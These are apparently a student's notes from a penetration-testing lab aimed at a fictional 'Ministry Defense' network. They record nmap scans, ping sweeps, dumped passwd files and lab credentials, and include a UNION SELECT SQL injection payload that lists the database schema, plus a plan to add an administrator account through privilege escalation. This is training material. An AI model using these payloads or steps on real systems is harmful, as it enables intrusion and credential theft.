## 1: Recon/Ping Sweep/Scan HTTP Scripts/Validate Ports

____________________________________________________________________________________________________________________
## 2: Check HTTP site/SQL methods/Post and Get/Authentication bypass

____________________________________________________________________________________________________________________
## 3: Utilize Golden Statement/Which is Vulnerable/Number of Fields/Modify Statement

____________________________________________________________________________________________________________________
## 4: Processes/tasks/crontab/auditpol/services

____________________________________________________________________________________________________________________
## 5: Binary/strings/Reverse Engineering/Ghidra/Source Code

____________________________________________________________________________________________________________________
## 6: Find Command/Sudo -l/GTFObins

____________________________________________________________________________________________________________________
### Username: MARO-007-M
### IP: 10.50.25.244
____________________________________________________________________________________________________________________
    Nmap scan report for 10.50.25.244 ----> MINISTRY-DEFENSE
    Host is up (0.0069s latency).
    Not shown: 998 filtered ports
    PORT   STATE SERVICE
    22/tcp open  ssh
    80/tcp open  http
    | http-enum: 
    |   /robots.txt: Robots file
    |   /images/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
    |_  /share/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
    
    Nmap done: 1 IP address (1 host up) scanned in 5.31 seconds
___________________________________________________________________________________________________________________
    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    games:x:5:60:games:/usr/games:/usr/sbin/nologin
    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
    www-data:x:33:33:usMiHwCWTW75U4QMb5O0:10/bin/sh
    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
    irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
    systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
    systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
    syslog:x:102:106::/home/syslog:/usr/sbin/nologin
    messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
    _apt:x:104:65534::/nonexistent:/usr/sbin/nologin
    lxd:x:105:65534::/var/lib/lxd/:/bin/false
    uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
    dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
    landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
    sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
    pollinate:x:110:1::/var/cache/pollinate:/bin/false
    ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
    openupthedoor:x:1001:1001::/home/openupthedoor:/bin/bash
___________________________________________________________________________________________________________________
    ::1 ip6-localhost ip6-loopback
    fe00::0 ip6-localnet
    ff00::0 ip6-mcastprefix
    ff02::1 ip6-allnodes
    ff02::2 ip6-allrouters
    ff02::3 ip6-allhosts
___________________________________________________________________________________________________________________
    192.168.28.0/27
    192.168.28.160/27
    FFcy67MnQaE33rt8JNm1
___________________________________________________________________________________________________________________
    64 bytes from 192.168.28.30: icmp_seq=1 ttl=64 time=0.258 ms
    64 bytes from 192.168.28.177: icmp_seq=1 ttl=63 time=1.36 ms
    64 bytes from 192.168.28.182: icmp_seq=1 ttl=63 time=1.64 ms
    64 bytes from 192.168.28.190: icmp_seq=1 ttl=64 time=0.063 ms
___________________________________________________________________________________________________________________
    Nmap scan report for 192.168.28.177 -----> DEFENSE_NIX1
    Host is up (0.00046s latency).
    Not shown: 999 closed ports
    PORT   STATE SERVICE
    22/tcp open  ssh
    21254/tcp open  unknown
    
    Nmap scan report for 192.168.28.182 -------> 
    Host is up (0.00045s latency).
    Not shown: 998 closed ports
    PORT   STATE SERVICE
    22/tcp open  ssh
    80/tcp open  http
    | http-enum: 
    |   /login/: Login page
    |   /robots.txt: Robots file
    |_  /images/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
    
    Nmap done: 2 IP addresses (2 hosts up) scanned in 1.43 seconds
___________________________________________________________________________________________________________________
    Array
        [0] => Msmith
        [name] => Msmith
        [1] => Squanchy
        [password] => Squanchy
    1Array
        [0] => Fpalic
        [name] => Fpalic
        [1] => Birdperson
        [password] => Birdperson
    1Array
        [0] => Kmichae
        [name] => Kmichae
        [1] => MrMeeseeks
        [password] => MrMeeseeks
___________________________________________________________________________________________________________________
    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    games:x:5:60:games:/usr/games:/usr/sbin/nologin
    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
    irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
    systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
    systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
    syslog:x:102:106::/home/syslog:/usr/sbin/nologin
    messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
    _apt:x:104:65534::/nonexistent:/usr/sbin/nologin
    lxd:x:105:65534::/var/lib/lxd/:/bin/false
    uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
    dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
    landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
    sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
    pollinate:x:110:1::/var/cache/pollinate:/bin/false
    ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
    mysql:x:111:115:MySQL Server,,,:/nonexistent:/bin/false
___________________________________________________________________________________________________________________
    ::1 ip6-localhost ip6-loopback
    fe00::0 ip6-localnet
    ff00::0 ip6-mcastprefix
    ff02::1 ip6-allnodes
    ff02::2 ip6-allrouters
    ff02::3 ip6-allhosts
    192.168.28.177 Defense_Nix1
    dv4WEHoTfU94JTHv57WV
___________________________________________________________________________________________________________________
    Locations=4 UNION SELECT 1,table_schema,table_name,column_name FROM information_schema.columns
    
___________________________________________________________________________________________________________________
    Province 	1
    Civilian population 	Rick Sanchez
    Residing Unit 	        Rsanch
    Troop strength 	        ScaryTerry
    
    Province 	1
    Civilian population 	Morty Smith
    Residing Unit 	        Msmith
    Troop strength 	        Squanchy
    
    Province 	1
    Civilian population 	Frank Palicky
    Residing Unit 	        Fpalic
    Troop strength 	        Birdperson
    
    Province 	1
    Civilian population 	Krombopulos Michael
    Residing Unit 	        Kmichae
    Troop strength 	        MrMeeseeks
___________________________________________________________________________________________________________________
    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    games:x:5:60:games:/usr/games:/usr/sbin/nologin
    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
    irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
    systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
    systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
    syslog:x:102:106::/home/syslog:/usr/sbin/nologin
    messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
    _apt:x:104:65534::/nonexistent:/usr/sbin/nologin
    lxd:x:105:65534::/var/lib/lxd/:/bin/false
    uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
    dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
    landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
    sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
    pollinate:x:110:1::/var/cache/pollinate:/bin/false
    ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
    Fpalic:x:1001:1001::/home/Fpalic:/bin/sh
___________________________________________________________________________________________________________________
Ministry_Defense website credentials are openupthedoor :: B12c3b34f ------> 10.50.25.244

Part2 AOR will be conducted on the 192.168.28.0/27 net.

Dev shop has created a Windows program which will create the following account: hack :: pass123 if a area can be identified to have the exe run at a higher priv level.

The hack account will be added to both the Administrators and Remote Desktop Users groups.

Resources:
moveup.exe

credentialDump.csv

netmap.png 
___________________________________________________________________________________________________________________
    64 bytes from 192.168.28.5: icmp_seq=1 ttl=127 time=6.28 ms
    64 bytes from 192.168.28.10: icmp_seq=1 ttl=63 time=0.816 ms
    64 bytes from 192.168.28.19: icmp_seq=1 ttl=63 time=1.33 ms
    64 bytes from 192.168.28.30: icmp_seq=1 ttl=64 time=0.178 ms
___________________________________________________________________________________________________________________
    Nmap scan report for 192.168.28.5
    Host is up (0.00057s latency).
    Not shown: 994 closed ports
    PORT     STATE SERVICE
    22/tcp   open  ssh
    135/tcp  open  msrpc
    139/tcp  open  netbios-ssn
    445/tcp  open  microsoft-ds
    3389/tcp open  ms-wbt-server
    9999/tcp open  abyss
    
    Nmap scan report for 192.168.28.10
    Host is up (0.00055s latency).
    Not shown: 999 closed ports
    PORT   STATE SERVICE
    22/tcp open  ssh
    
    Nmap scan report for 192.168.28.19
    Host is up (0.00057s latency).
    Not shown: 999 closed ports
    PORT   STATE SERVICE
    22/tcp open  ssh
    
    Nmap done: 3 IP addresses (3 hosts up) scanned in 1.88 seconds
___________________________________________________________________________________________________________________

___________________________________________________________________________________________________________________

___________________________________________________________________________________________________________________

___________________________________________________________________________________________________________________

___________________________________________________________________________________________________________________

___________________________________________________________________________________________________________________

___________________________________________________________________________________________________________________

___________________________________________________________________________________________________________________

___________________________________________________________________________________________________________________

___________________________________________________________________________________________________________________

___________________________________________________________________________________________________________________

___________________________________________________________________________________________________________________

___________________________________________________________________________________________________________________

___________________________________________________________________________________________________________________

___________________________________________________________________________________________________________________

___________________________________________________________________________________________________________________

___________________________________________________________________________________________________________________

___________________________________________________________________________________________________________________

___________________________________________________________________________________________________________________

___________________________________________________________________________________________________________________

___________________________________________________________________________________________________________________

___________________________________________________________________________________________________________________

___________________________________________________________________________________________________________________

___________________________________________________________________________________________________________________

___________________________________________________________________________________________________________________

___________________________________________________________________________________________________________________

___________________________________________________________________________________________________________________

___________________________________________________________________________________________________________________

___________________________________________________________________________________________________________________

___________________________________________________________________________________________________________________

___________________________________________________________________________________________________________________
